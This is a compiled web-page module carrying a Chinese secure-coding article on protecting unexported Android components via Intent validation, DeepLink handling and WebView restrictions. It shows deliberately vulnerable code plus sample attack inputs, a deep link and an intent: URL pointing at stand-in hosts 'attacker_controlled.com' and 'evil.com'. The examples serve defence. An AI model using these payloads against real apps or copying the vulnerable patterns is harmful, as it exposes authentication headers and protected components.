import{o as n,c as a,e as s}from"./app.d2d52540.js";const t='{"title":"如何保护导出组件","description":"","frontmatter":{"title":"如何保护导出组件","date":"2022-01-11T13:57:03.000Z","hide":false,"tags":["security","app","android"],"categories":["技术相关"]},"headers":[{"level":2,"title":"四大组件如何保护","slug":"四大组件如何保护"},{"level":3,"title":"不要从外部输入的Intent直接创建Intent","slug":"不要从外部输入的intent直接创建intent"},{"level":3,"title":"对直接创建的Intent进行足够的检查","slug":"对直接创建的intent进行足够的检查"},{"level":2,"title":"DeepLink","slug":"deeplink"},{"level":3,"title":"shouldOverrideUrlLoading","slug":"shouldoverrideurlloading"},{"level":3,"title":"加载url问题","slug":"加载url问题"}],"relativePath":"app_security/android_howto_protected_unexported_components.md","lastUpdated":1643422869488}',e={},p=[s('<p>上一篇讲了[为什么要保护未导出组件]](android_access_protected_components.md),这一篇来说一下如何保护. 发现问题,我们就要有解决之道. 上一篇中所有的攻击行为,最终都要通过ProxyActivity作为入口,所以这里进行了阻断,那么就没有后续的问题了. 针对这个问题,有哪些攻击面呢:</p><ul><li>导出的四大组件</li><li>DeepLink</li></ul><h2 id="四大组件如何保护"><a class="header-anchor" href="#四大组件如何保护" aria-hidden="true">#</a> 四大组件如何保护</h2><p>导出的四大组件主要是通过Intent进行传递数据,总的来说只要我们:</p><ol><li>不保证从getIntent之类的外部用户给出的Intent中直接创建Intent.</li><li>如果直接创建了Intent,要进行足够严格的检查.</li></ol><h3 id="不要从外部输入的intent直接创建intent"><a class="header-anchor" href="#不要从外部输入的intent直接创建intent" aria-hidden="true">#</a> 不要从外部输入的Intent直接创建Intent</h3><p>如果这条做到了,基本不大可能会出现问题,但是关键是有时候我们的业务需要,就是需要存在类似ProxyActivity的功能,那么该怎么办呢</p><h3 id="对直接创建的intent进行足够的检查"><a class="header-anchor" href="#对直接创建的intent进行足够的检查" aria-hidden="true">#</a> 对直接创建的Intent进行足够的检查</h3><ol><li><p>尽量不把Intent转给自己,如非必要,只转发Intent给其他package.</p></li><li><p>转发给自己的要严格检查</p><ul><li>不能包含Intent.FLAG_GRANT_READ_URI_PERMISSION,Intent.FLAG_GRANT_WRITE_URI_PERMISSION等flag</li><li>对数据要做严格校验,比刚刚给上一篇中的AuthWebViewActivity的Intent中的url只能是指定的Host</li></ul></li><li><p>Intent.parseUri的时候一定不要提供Intent.URI_ALLOW_UNSAFE <code>(startActivity(Intent.parseUri(url, Intent.URI_INTENT_SCHEME | Intent.URI_ALLOW_UNSAFE))</code>这种是非常危险的</p></li><li><p>FileProvider不要提供<code> &lt;root-path name=&quot;root&quot; path=&quot;&quot;/&gt;</code>这样的配置,确保共享的目录范围可控.</p></li></ol><h2 id="deeplink"><a class="header-anchor" href="#deeplink" aria-hidden="true">#</a> DeepLink</h2><p>DeepLink实际上是Intent的一种特定形式,比如:</p><div class="language-xml line-numbers-mode"><pre><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>activity</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>.AuthWebViewActivity<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">android:</span>exported</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>false<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>intent-filter</span><span class="token punctuation">&gt;</span></span>\n        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>action</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>android.intent.action.VIEW<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>\n        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>category</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>android.intent.category.DEFAULT<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>\n        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>data</span> <span class="token attr-name"><span class="token namespace">android:</span>scheme</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>victim<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">android:</span>host</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>secure_handler<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>intent-filter</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>activity</span><span class="token punctuation">&gt;</span></span>\n</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>这里提供了scheme <code>vicitim://</code>,这种类型的url会有系统自动转发给AuthWebViewActivity. 比如在浏览器中输入<code>victim://some_victim_path?url=http://attacker_controlled.com</code></p><div class="language-java line-numbers-mode"><pre><code>webView<span class="token punctuation">.</span><span class="token function">loadUrl</span><span class="token punctuation">(</span><span class="token function">getIntent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getQueryParameter</span><span class="token punctuation">(</span><span class="token string">&quot;url&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">getAuthHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="shouldoverrideurlloading"><a class="header-anchor" href="#shouldoverrideurlloading" aria-hidden="true">#</a> shouldOverrideUrlLoading</h3><p>shouldOverrideUrlLoading 未必与DeepLink直接相关,但是一般都有关系. 如果重载了shouldOverrideUrlLoading,而且访问的页面又不是可以完全信任的(绝大多数都是这种情况),那么就相当于一个未导出的Webview变成了导出的.</p><p>比如:</p><div class="language-java line-numbers-mode"><pre><code><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">shouldOverrideUrlLoading</span><span class="token punctuation">(</span><span class="token class-name">WebView</span> view<span class="token punctuation">,</span> <span class="token class-name">WebResourceRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n    <span class="token class-name">Uri</span> uri <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">&quot;intent&quot;</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>uri<span class="token punctuation">.</span><span class="token function">getScheme</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n    \t<span class="token class-name">Intent</span> intent <span class="token operator">=</span> <span class="token class-name">Intent</span><span class="token punctuation">.</span><span class="token function">parseUri</span><span class="token punctuation">(</span>uri<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Intent</span><span class="token punctuation">.</span>URI_INTENT_SCHEME<span class="token punctuation">)</span><span class="token punctuation">;</span>\n    \tintent<span class="token punctuation">.</span><span class="token function">addCategory</span><span class="token punctuation">(</span><span class="token string">&quot;android.intent.category.BROWSABLE&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    \tintent<span class="token punctuation">.</span><span class="token function">setComponent</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token function">startActivity</span><span class="token punctuation">(</span>intent<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n    <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">shouldOverrideUrlLoading</span><span class="token punctuation">(</span>view<span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token punctuation">}</span>\n</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>如果页面中的js执行:</p><div class="language-js line-numbers-mode"><pre><code>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">&quot;intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end&quot;</span><span class="token punctuation">;</span>\n</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>这里就像前面提到的,变成了一个导出的组件.可以任意访问内部未导出组件了.</p><p>下面这些应该写么?</p><h3 id="加载url问题"><a class="header-anchor" href="#加载url问题" aria-hidden="true">#</a> 加载url问题</h3><p>如果LoadUrl可控,比如更改的<code>webView.loadUrl(getIntent().getData().getQueryParameter(&quot;url&quot;), getAuthHeaders());</code>,那么要考虑:</p><ol><li>任意文件读取问题 <a href="https://blog.csdn.net/zy_strive_2012/article/details/96474592" target="_blank" rel="noopener noreferrer">Android中WebView的跨域漏洞分析和应用被克隆问题情景还原(免Root获取应用沙盒数据)</a></li><li>XSS问题 scheme是<code>javascript://</code>,那么就可以直接在当前页面执行任意js脚本.</li></ol><p>针对这些问题:</p><ol><li>不要允许webview访问FileUrl</li><li>不要允许javascript等scheme,应该只允许特定的scheme.</li></ol><p>参考文档: <a href="https://blog.oversecured.com/Android-Access-to-app-protected-components/#access-to-arbitrary-components-via-webview" target="_blank" rel="noopener noreferrer">Android: Access to app protected components</a></p>',28)];e.render=function(s,t,e,o,c,l){return n(),a("div",null,p)};export{t as __pageData,e as default};